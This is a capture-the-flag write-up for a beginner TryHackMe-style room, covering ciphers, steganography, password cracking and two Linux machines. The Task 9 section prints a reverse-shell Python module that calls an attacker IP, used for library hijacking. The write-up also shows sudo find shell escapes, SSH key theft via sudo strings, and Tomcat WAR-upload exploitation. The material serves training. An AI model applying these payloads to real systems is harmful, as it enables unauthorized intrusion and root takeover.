# The Brickathon Preseason Writeup

## Overview

The Brickathon Preseason is a easy room that contains a number of machines and challenges for a CTF hosted by WithYouWithMe March 2022. All tasks were built to be an easy level as an introduction to CTF competitions.

# Task 1 - The Brickathon Preseason

This task is a simple intro and there is no answer for the flag, just hit complete and you're ready to get started.

# Task 2 - Crypto Challenges

Task 2 includes two basic crypto challenges. For each of these there are a number of methods to solve them however, this writeup will just cover one for each.

## Encoding 1

For encoding 1 we can put the encoded message into [CyberChef](https://0x1.gitlab.io/code/CyberChef/) which is a common tool for endcoding and decoding. Using the simple **Magic**  recipe the encoding can begin to be broken down. 

![217cfb68f40e4ca7b488e5d473d3b0c6](https://user-images.githubusercontent.com/104072961/164222171-1c0fb835-3915-4fe3-ac09-34cd52be9a89.png)

From the output it is seen that the message begins to take a more recognisable form, as we know from the introduction that unless specified all flags will take on the format `WYWM{This_is_a_flag}`:

![ce8b81d8603e44748cc02c95481bbcfe](https://user-images.githubusercontent.com/104072961/164222341-b937ba19-5b56-4545-8f92-57caca9efd89.png)


It tells me that the message is potentially been encoded with base64 in part, but there appears to be a second layer of encoding. After examining the new code it can be seen that KMKA (which I know needs to be WYWM) may be a simple ROT cipher. In this case it looks to be ROT12 which can be tested using CyberChef again:

![fc43b77c76bb4f30b10397a24abdcd52](https://user-images.githubusercontent.com/104072961/164222379-1573b0aa-f96c-4ec8-a712-d183ea0bea7a.png)

Bingo!!

## Encoding 2

A slightly different method was used to determine the encoding for the second message. [Boxentriq](https://www.boxentriq.com/code-breaking/cipher-identifier) has a handy tool which allows users to analyse codes to determine potential Cipher types. Using this tool it is determined that this particular message is likely encoded using a [Vigenere Autokey Cipher](https://www.boxentriq.com/code-breaking/cipher-identifier#vigenere-autokey-cipher) . This site also has tools for decoding this sort of cipher. Running the message through the tool and using the `Auto Solve` button the following results appear.

![8a3a6e63bb874625b3ac8cc213b2ad64](https://user-images.githubusercontent.com/104072961/164222429-5579dc0f-a688-4321-8267-16de117d850f.png)

That looks like a flag to me.

> For more information on the encoding used in these challenges try looking into Caesar Cipher, ROT, Base64 and Vigenere Cipher. These are just some basic methods of encoding used to help introduce users to some of the forms of encoding and tools that can be used to crack them.

# Task 3 - Steganography - Mapping it all out

The next few tasks (3-5) were all Steganography challenges. Again, these few tasks were designed to introduce some of the tools and techniques that can be used to solve Steganography challenges. 

As the challenge states:

"***Steganography is the practice of hiding a secret message in something that is not secret.***"

For this particular task I started with the basics and checked the file with tools like `Steghide` but was unable to find anything. At this point I started looking at some of the online tools available to hide images inside other images. It is likely that there are a number of online tools that will produce the same result however, I used the following:

https://incoherency.co.uk/image-steganography/#unhide

When I uploaded the image I saw instant results.

![88e916b9ed6e4bc4994be4ad2a72a7d0](https://user-images.githubusercontent.com/104072961/164222475-5b18bce1-22b1-4653-b4ee-842783e727a2.png)

It appears the flag was hidden or overlayed inside the lower "bits" of the map image. [Wikipedia](https://en.wikipedia.org/wiki/Steganography) actually has some good information on Steganography for additional research.

# Task 4 - Steganography - Looking Good

This flag took no time at all. I simply used the tool `Steghide` to extract any files from the .jpeg. The file `flag.txt` had been hidden within the image. Using the command:

```steghide extract -sf aqua.jpeg```

> In this case there was no passphrase

![4bcecadc3d0b4035a5dd6d498a82be9b](https://user-images.githubusercontent.com/104072961/164222528-e72f666b-77e1-40d4-bce7-0e5ddd591fd0.png)

Simple!!!

# Task 5 - Steganography - Cam's Super Security

Ok, so this flag took people a bit longer than it should have...

After trying a number of tools, both online and on my kali machine eventually I found this one. The tool I used in the end was my "Mark 1 Eyeball"

![dc306b14fb534c1089ee9afe740a82f9](https://user-images.githubusercontent.com/104072961/164222597-5f81fb8e-f91f-4884-b963-f0180b51601b.png)

Excellent, hidden in plan sight...Just zoom in.

# Task 6 - Lock it down

In this task, we are provided with a file called **secret-data.xls** which is encrypted. Again noting that this room is designed to introduce users to CTF challenges and some simple techniques we can start of simple. Using tools native to Kali Linux we will attempt to crack the password on this file.

To start with we can use the `office2john.py` module from the tool `Johntheripper` to extract the hash from the file:

```python /usr/share/john/office2john.py secret-data.xls > password```

![faebc0680d224d7bb6882587c2c22b56](https://user-images.githubusercontent.com/104072961/164222705-8585e9d8-f112-4c76-b584-f0e9c892b697.png)

The next step is using `Johntheripper` to actually crack this hash.

```john --wordlist=/usr/share/wordlists/rockyou.txt password```

![242bee89ce054575aa0f7df1a96f60e5](https://user-images.githubusercontent.com/104072961/164222761-bc63f0e7-5b33-40e5-9b42-60dbe0b7aa96.png)


Now, if `openoffice` or some equivalent is installed on your kali machine you should be able to open it there. Alternatively, if you have Microsoft Office on your host that will work too:

![0eab92de72f14c389ddc0e94b86ac1dd](https://user-images.githubusercontent.com/104072961/164222878-647c22d4-e2e6-45b4-9de8-ab5cd1bf1408.png)

# Task 7 - Crossing Wires

This challenge was a logic circuit created in a way that there was only one solution. Before solving the circuit, its important to know how each of the logic gates (the symbols) work.


![image](https://user-images.githubusercontent.com/104072961/164225120-9228064d-1fa1-4a6b-8d8d-359da503c605.png)
| A | B | OUT |
| ----- | ------ | ------ |
|0|0|0|
|0|1|1|
|1|0|1|
|1|1|1|


![image](https://user-images.githubusercontent.com/104072961/164225246-5cce3050-b0aa-49a7-91f2-01b92a55dc25.png)
| A | B | OUT |
| ----- | ------ | ------ |
|0|0|0|
|0|1|1|
|1|0|1|
|1|1|0|


![image](https://user-images.githubusercontent.com/104072961/164225360-e9049940-1f33-447e-8ce9-d8abc71aa828.png)
| A | OUT |
| ----- | ------ |
|0|1|
|1|0|

![image](https://user-images.githubusercontent.com/104072961/164225428-9a7cc3c8-734d-4346-9358-010ae588a296.png)
| A | B | OUT |
| ----- | ------ | ------ |
|0|0|1|
|0|1|0|
|1|0|0|
|1|1|0|


![image](https://user-images.githubusercontent.com/104072961/164225555-bbb9ae25-d388-43ae-9304-a2b99ba9d67e.png)
| A | B | OUT |
| ----- | ------ | ------ |
|0|0|1|
|0|1|1|
|1|0|1|
|1|1|0|


![image](https://user-images.githubusercontent.com/104072961/164225607-e60a359e-5d8c-4fd3-a09b-fecc30f930cd.png)
| A | B | OUT |
| ----- | ------ | ------ |
|0|0|0|
|0|1|0|
|1|0|0|
|1|1|1|

With the mechanics of the gate sorted, we begin solving each of the gates starting at the end and working our way backwards.Some gates have several possible configurations, cycle between each of the possible configurations until each input can be traced to a single possible answer.

![image](https://user-images.githubusercontent.com/104072961/164223900-9a7ab658-4469-43f1-a6d7-cc2666850652.png)

When your configuration results in a signal being provided to the final output, enclose your solution in WYWM{} from top to bottom

**WYWM{1110011001}**

## Alternate solution

Because this is a base 2 solution with 10 input gates, this means there are 2^10 or 1024 possible answers to this solution. While not ideal, it is possible to bruteforce the answer using burp repater versus tryhackme.

# Task 8 - Brick-one

This task is the first machine of the CTF, and it starts a little bit differently. The first set of credentials have been provided to us, telling me this is going to be more about Priv Esc/lateral movement within the target.

I didn't actually run a scan for this machine, I just kind of guessed that SSH would be available and logged in using the provided creds:

```ssh vic@10.10.150.62```

**vic:WYWM**

![image](https://user-images.githubusercontent.com/104072961/164223940-6d240153-b444-4c98-b236-9e6c79723a55.png)

Now that we are on the system we can start looking for potential Priv Esc opportunities. As seen in the image above I also ran **bash** just to get a better shell. I just tried this because I was connected over **SSH** an assumed it might give me something better. 

Having a look around the file structure, I can seem to find any flags at this stage. I was however able to find a binary in `/home/mic`  called **brickA**, unfortunately there is no permissions for this user. This is interesting, especially considering the comment for the first flag:

*Once you find the brick, there should be a word in CAPITAL in it. Enter it here.*

## Priv Esc 1

After doing some basic checks I found an interesting binary that had SUID permission. To find this you would use something like **Linpeas** or simply run the following command:

```find / -perm -u=s -type f 2>/dev/null```

![image](https://user-images.githubusercontent.com/104072961/164223961-f2bf0fd4-240d-4ee9-bce8-3f95049d1253.png)

> For more info about SUID permissions I suggest checking out this [article on SUID permissions](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/). For a list of common exploits using SUID make sure to have a look at [GTFOBins](https://gtfobins.github.io/)

This particular file does not seem to appear in GTFOBins and it has a non-standard name so I assume it was written for this machine. When I try running this program to see what it does, it seems to open up **Nano** the text editing program. 

With this in mind I decided to have a look at the binary I found in `/home/mic/brickA` to see if this would allow me to read anything inside it that might provide a clue.

![image](https://user-images.githubusercontent.com/104072961/164223987-f8dae6f1-a16b-42ca-b415-e560165d6eff.png)

Bingo - Flag 1 - WINNER

Additionally, looks like we have been given Mic's password. 

mic:YouWillNotFindIT

Using `su` I can now log in as mic:

![image](https://user-images.githubusercontent.com/104072961/164224005-89777631-8acf-4451-a6e3-5acf99c4ab0e.png)

## Priv Esc 2

Starting again with some basic Priv Esc checks I quickly found the following:

![image](https://user-images.githubusercontent.com/104072961/164224023-6d4d5489-f598-4df8-b958-a4658ca47332.png)

So this use can run **find** and **cat** as root without a password. Having a quick look at the old faithful GTFOBins looks like this might be an easy win.

![image](https://user-images.githubusercontent.com/104072961/164224048-e3c20729-2e4d-4114-9870-834888355b06.png)

```sudo find . -exec /bin/sh \; -quit```

![image](https://user-images.githubusercontent.com/104072961/164224071-e199a820-3184-414d-b785-9dd7f550992e.png)

A nice quick win there. Now to find the flag it self.

![image](https://user-images.githubusercontent.com/104072961/164224094-bde40510-0197-49ef-b457-6bc9f90c138b.png)

# Task 9 - WYWM-Bricknation

This machine is an easy, entry level machine that demonstrates a number of different beginner level techniques.

## Initial Recon

This first scan I ran on this machine was an **Nmap** scan to see what services/ports were available.

```sudo nmap -A 10.10.151.18```

This revealed three open ports with the following key information:

| Port | Service | Notes |
| --- | --- | --- |
|21/tcp  | Pure-FTPd| Anonymous login available |
|22/tcp  | OpenSSH | 7.6p1 Ubuntu 4
|8080/tcp | Apache Tomcat | 9.0.58

Full output:
![image](https://user-images.githubusercontent.com/104072961/164224120-dc5f3b77-1f61-49d8-bf7e-11c1fb622974.png)

## Enumeration

## Port 21 - FTP

From the nmap scan we can already see some interesting files. Lets log into the target using FTP and see if we can read the files.

![image](https://user-images.githubusercontent.com/104072961/164224154-5fc36816-5b67-4af2-91d9-93bc467c78fc.png)

Logging in as the user **anonymous** with no password we are able to download both files to our kali machine.

Opening up the file `useless-cameron` we are presented with some potentially useful information:

*I always forget my password. This should be safe. No one will be able to guess my username.*

*surelythisisntinrockyou*

Noting the comment about not being able to guess a username I decided to come back to this as there are still ports to be enumerated.

### Flag 1 - Anonymous FTP login

One of the files that was downloaded via FTP was `flag1.txt`, reading this file gave me the first flag.

## Port 8080 - ApacheTomcat

Opening up this address in the web browser, we are greeted with the standard tomcat page:

![image](https://user-images.githubusercontent.com/104072961/164224191-552aa980-377d-4303-bb7b-4f64a93125d7.png)

I know there are some pretty standard exploits for Tomcat if we are able to log into the `manager app` so that was the first place I checked. I tried a bunch of [default credentials](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown) as well as the password that we found via FTP. But I had no luck. I also ran a **Dirbuster** scan to check for any directories and again had no luck turning up any useful results.

After continuing to dig for a little while, I had a thought about the final port which I hadn't really looked at.

## Port 22 - SSH 7.6p1 Ubuntu 4

Although this is a "fairly" up-to-date version of openssh I did remember that there was a username enumeration vulnerability in some versions. After a bit of research I found what I was looking for.

*OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed, related to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.* [NVD](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15473)

*On some versions of OpenSSH under some configurations, OpenSSH will return a "permission denied" error for an invalid user faster than for a valid user, creating an opportunity for a timing attack to enumerate users.* [rapid7](https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_enumusers/)

Ok, so looks like there is even a **metasploit** exploit I can use.

![image](https://user-images.githubusercontent.com/104072961/164224226-5f00968e-27a8-4ba7-80a7-54026a6faa83.png)

> Note, this can be time consuming so its important to use a shorter list where possible. If you have a good list of username that you have come across in your recon that would be handy. In this case I used a short list from the metasploit wordlists.

After waiting for a few minutes the first username came back:

![image](https://user-images.githubusercontent.com/104072961/164224244-e34d9b5e-be2f-476f-988c-172c5833804f.png)

**adam**

I left the scan running but started to test again with this username. I was still unable to log into SSH, however. This did give me access to the Apache Tomcat Manager app.

## Initial foothold

Using the password found via FTP and the username found by enumerating the SSH service I finally got some working creds.

**adam:surelythisisntinrockyou**

Using these creds I was able to login to the Apache Tomcat Manager app:
![image](https://user-images.githubusercontent.com/104072961/164224279-764955a3-1526-4089-84ca-83e9b4095449.png)

Now that we are authenticated users we can have a look at potential exploits as an authenticated user. After a bit of research I found a decent article which exploits the Tomcat manager app.

https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/

This article shows two methods, one uses **Metasploit** and the other is a manual upload of a `.war` file containing a java reverse shell. For this I am just going to use the msf exploit but it would be worth trying the more manual version, especially if you are interested in completing your OSCP one day.

![image](https://user-images.githubusercontent.com/104072961/164224315-754ef12e-0334-4151-ad3e-053112d60ad2.png)

With the options updated, ensuring that we select the correct LHOST, RHOSTS, RPORT and Creds, the exploit can be run.

![image](https://user-images.githubusercontent.com/104072961/164224335-fa143612-5c65-421e-bc1b-f9abd465b0e4.png)

Personal preference here, I like to work with a normal shell rather than meterpreter, so I ran the command `shell` to get a shell and then:

```python3 -c "import pty; pty.spawn ('/bin/bash')"``` 

to get a normal bash shell. Then by running `cd ~` I can have a look at the home directory for this user.

### Flag 2 - Tomcat user home directory

The second flag is located here in the `/opt/tomcat` directory. This is the home directory for this user.

## Priv Esc - Cameron

Exploring the file structure I was unable to find anything too interesting, other than some other possible users. In the `/home` directory there is a directory for `cameron` but we have no access to it at this stage. 

Starting to look at other permissions and possible Priv Esc approaches, I tried `sudo -l` and discovered the following:

![image](https://user-images.githubusercontent.com/104072961/164224357-f16036d3-f709-4c1c-bf15-964a6b748861.png)

We are able to run the **strings** binary as the user cameron. At this point I started thinking about what interesting files may be located within `/home/cameron` that I might be able to read with **strings**.

After a few attempts I was able to access `/home/cameron/.ssh/id_rsa` which is the SSH key for a login as cameron.

```sudo -u cameron /usr/bin/strings /home/cameron/.ssh/id_rsa```

![image](https://user-images.githubusercontent.com/104072961/164224378-fe5da79d-ac49-4cf1-9b97-e13c120efae5.png)

I then copied this into a new file (in this case I called it **key**), and used `chmod 600 ./key` to make it usable as a key. Now I can try and connect to the target using SSH as cameron.

![image](https://user-images.githubusercontent.com/104072961/164224401-a34cdffc-f951-419d-a79d-946721b34ab1.png)

Looks like we have a new user.

### Flag 3

Flag 3 is located in `/home/cameron` and now that we have access as the user cameron, we can read the flag file.

## Priv  Esc - root

Having a look around the file structure as the user Cameron, the only interesting file I found straight away was `/home/cameron/Documents/backup.py`. This file contained the following:

```
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

It looks like this script is taking a zip backup of some of the files on the target. By its self this doesn't do much, and we are unable to edit the file as it is owned by root.

![image](https://user-images.githubusercontent.com/104072961/164224437-5b4ff5bc-caf6-4c4c-ade4-2b088d5295e4.png)

However, straight away this makes me thing that there might be a cronjob or something running that will execute this periodically. Just based of the fact its taking a backup of something and owned by root. A tool I like to use to look at this kind of thing is called **[pspy](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0)**

By hosting a quick python http server I am able to upload this to the target using **wget**.

![image](https://user-images.githubusercontent.com/104072961/164224468-fe5331a2-b4d6-4833-9bc7-76712e21b456.png)

Ensuring that we make the new binary executable using `chmod +x` the new program can be run. All this does is continually monitors the active processes so that if a command is run or process starts it is captured even if it closes or stops.

The output from **pspy** shows us there there is a job running. It runs every two minutes.

![image](https://user-images.githubusercontent.com/104072961/164224486-846611f5-e400-43c0-92fa-e02da18672f5.png)

Every two minutes Root is running the command:
```/bin/sh -c python3 /home/cameron/Documents/backup.py```

### Python library hijacking

After doing some research and trying to find away to exploit the information found above I cam across the concept of Python library hijacking. Essentially, at lest in this case, when a python script tries to import modules from the python library there are a list of directories it will check for those modules. The thing is it will check these in order. At the top of this list by default is the directory that the python script is being run from i.e. `/home/cameron/Docuements`.

If we can write a malicious python module with the same name in the directory that this script is being run from, when it runs it will run our script before trying to look any further.

>For some more information have a look at the following articles
>https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
>https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8
>https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/

I pulled my malicious script straight from one of the articles above, all I needed to change was my ip address.

```
import os
import pty
import socket

lhost = "10.4.23.252"
lport = 4444

ZIP_DEFLATED = 0

class ZipFile:
    def close(*args):
        return

    def write(*args):
        return

    def __init__(self, *args):
        return

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()
```

I then used **nano** to save the file to the same directory as `backup.py`

![image](https://user-images.githubusercontent.com/104072961/164224526-05ad2fd5-2b82-45bb-98eb-ead7228168c9.png)

Now all that should be left is to run a **netcat** listener and wait for the script to run.

![image](https://user-images.githubusercontent.com/104072961/164224571-664f3c0f-c6b5-4a4f-b129-0948c57b894c.png)

There we have a nice shell as Root.

### Flag 4 

The final flag is located in `/root` and is accessible as the user Root.

# Task 10 - ThousandHashes

So this task is a bit of a simple programming challenge. Essentially, users are provided with the string `61v3_m3_k3y_pl3453` and they need to use a sequence of 5 hashing algorithms to hash the string 1000x total, resulting in a final hash which is the flag.

One of the competitors came up with a nice little script for this so shout outs to **[horrorclause](https://github.com/horrorclause/THM_Thousand_Hashes)** Follow the link to his gitbub page which include his writeup for this one.

The script used is as follows:

```
#!/usr/bin/env python3

import hashlib

#thm = '61v3_m3_k3y_pl3453'
var = input("Please Enter String >> ")
n = str(var)

var = var.encode('utf-8')

cycle = int(input("How many iterations?\nEnter a number: "))

for i in range(cycle):

    output = hashlib.sha512(var)  # SHA512
    #print(output.hexdigest() + ' SHA512')

    output = output.hexdigest().encode("utf-8") # Encodes SHA512 as UTF-8 for input for hashlib
    output = hashlib.md5(output)  # MD5
    #print(output.hexdigest() + ' MD5')

    output = output.hexdigest().encode("utf-8")  # Encodes MD5 as UTF-8 for input for hashlib
    output = hashlib.sha256(output)  # SHA256
    #print(output.hexdigest() + ' SHA256')

    output = output.hexdigest().encode("utf-8")  # Encodes SHA256 as UTF-8 for input for hashlib
    output = hashlib.sha1(output)  # SHA1
    #print(output.hexdigest() + ' SHA1')

    output = output.hexdigest().encode("utf-8")  # Encodes SHA1 as UTF-8 for input for hashlib
    output = hashlib.sha224(output)  # SHA224
    #print(output.hexdigest() + ' SHA224')

    #print('\n---------------------\n')
    #print(i)

    var = output.hexdigest().encode('utf-8') # Sets var as SHA224 digest so it can be fed back in loop
    finalHash = output.hexdigest()

print('\n[+]== Hashing Complete! ==[+]\n')
print('Given String: ' + n)
print("Number of Cycles: " + str(cycle) + '\n')
print("SHA224: " + finalHash)
```

After running this script against the provided string we get our final hash:

![image](https://user-images.githubusercontent.com/104072961/164224625-2bbd9d25-5325-4ebd-a18e-1de83ce3b0fe.png)

>Note, there are 5 different algorithms and we need to run through 1000 total, so 5x200=1000...Hope the math makes sense.

This makes the flag:

**WYWM{e506b762b1180fd20ba360cb18bfb1860a460173aef73a1723ac5d8a}**

Winner, winner, chicken dinner!!!

# Summary

All these challenges were fairly simple and straight forward by demonstrated a good introduction to CTF competitions. Remember, these challenges would all be considered easy and completing this room will give you a nice understanding of some of the basic things to look at in a CTF and some of the types of challenges you might come across. 

Happy hacking...
